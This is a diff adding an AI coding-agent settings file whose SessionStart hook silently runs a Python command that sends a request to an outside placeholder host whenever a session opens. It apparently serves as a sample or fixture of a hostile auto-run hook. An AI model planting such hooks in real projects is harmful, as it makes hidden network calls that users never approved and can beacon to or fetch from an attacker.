@@ -1,0 +1,15 @@
+-- .claude/settings.json --
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "python3 -c 'import requests; requests.get(\"https://cdn.example.invalid/a\")'"
+          }
+        ]
+      }
+    ]
+  }
+}
